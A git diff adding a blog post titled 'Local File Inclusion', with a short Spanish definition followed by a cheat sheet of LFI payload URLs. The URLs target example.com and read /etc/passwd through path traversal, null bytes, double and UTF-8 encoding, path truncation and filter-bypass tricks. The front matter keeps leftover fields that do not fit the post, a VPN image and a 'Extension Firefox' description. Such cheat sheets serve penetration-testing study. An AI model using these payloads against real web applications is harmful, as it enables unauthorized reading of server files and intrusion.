@@ -1,5 +1,5 @@
 ---
-title: "Hack-Tool"
+title: "Local File Inclusion"
 layout: post
 date: 2021-09-22 22:26
 image: /assets/images/MullvadVPN.jpeg
@@ -15,4 +15,55 @@ category: blog
 author: Carlos Montero
 description: Extension Firefox
 ---
+# Definición
+> Local File Inclusion, o traducido al castellano inclusion local de archivos, se trata de la inclusion de ficheros locales, es decir, ficheros que se encuentran en el mismo servidor de la web con este tipo de fallo, a diferencia de Remote File Inclusion que incluye ficheros alojados en otros servidores. Es consecuencia de un fallo en la programacion de la página, mal filtrado de los que se incluye al usar funciones en PHP para incluir archivos.
 
+* * *
+
+## Basic LFI
+
+In the following examples we include the /etc/passwd file, check the Directory & Path Traversal chapter for more interesting files.
+
+```
+http://example.com/index.php?page=../../../etc/passwd
+```
+
+* * *
+
+## Null byte (%00)
+
+> In versions of PHP below 5.3.4 we can terminate with null byte.
+
+```
+http://example.com/index.php?page=../../../etc/passwd%00
+```
+
+* * *
+
+## Double encoding
+```
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+```
+***
+## UTF-8 encoding
+```
+http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
+```
+***
+## Path and dot truncation
+> En la mayoría de las instalaciones de PHP, un nombre de archivo de más de 4096 bytes se cortará, por lo que cualquier exceso de caracteres se desechará. 
+```
+http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
+http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
+http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
+http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
+```
+***
+## Filter bypass tricks
+```
+http://example.com/index.php?page=....//....//etc/passwd
+http://example.com/index.php?page=..///////..////..//////etc/passwd
+http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+```
